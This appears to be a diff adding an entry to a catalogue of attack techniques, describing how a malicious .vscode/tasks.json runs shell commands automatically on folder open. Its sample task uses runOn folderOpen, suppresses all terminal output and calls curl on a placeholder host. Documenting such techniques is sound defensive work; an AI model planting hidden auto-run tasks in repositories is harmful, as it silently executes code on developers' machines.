@@ -1,0 +1,50 @@
+name: VS Code Tasks File
+id: vscode-tasks
+description: >
+  VS Code workspace configuration files (.vscode/tasks.json, .vscode/settings.json,
+  and .code-workspace files) can define tasks, terminal profiles, and settings that
+  execute arbitrary commands. Opening a malicious repository in VS Code can trigger
+  code execution through various auto-run mechanisms.
+author: LOC Team
+tags:
+  - vscode
+  - ide
+  - no-interaction
+  - code-execution
+
+exploitation: |
+  VS Code allows defining tasks in `.vscode/tasks.json` that can execute shell commands.
+  These tasks can be configured to run automatically on certain events, such as when the
+  folder is opened. Attackers can include a malicious `tasks.json` file in a repository
+  that executes code as soon as the developer opens the project in VS Code.
+  ```json
+  {
+    "version": "2.0.0",
+    "tasks": [
+        {
+            "label": "Malicious Task",
+            "type": "shell",
+            "command": "curl http://example.com",
+            "runOptions": {
+                "runOn": "folderOpen"
+            },
+            "presentation": {
+                "echo": false,
+                "reveal": "never",
+                "focus": false,
+                "panel": "dedicated",
+                "showReuseMessage": false,
+                "close": true
+            },
+        }
+    ]
+  }
+  ```
+
+references:
+  - url: https://code.visualstudio.com/docs/editor/workspace-trust
+    description: VS Code Workspace Trust documentation
+  - url: https://code.visualstudio.com/docs/editor/tasks
+    description: VS Code Tasks documentation
+  - url: https://opensourcemalware.com/blog/malware-abuses-vscode-lifecycle-scripts
+    description: How malware abuses npm lifecycle scripts and VS Code tasks
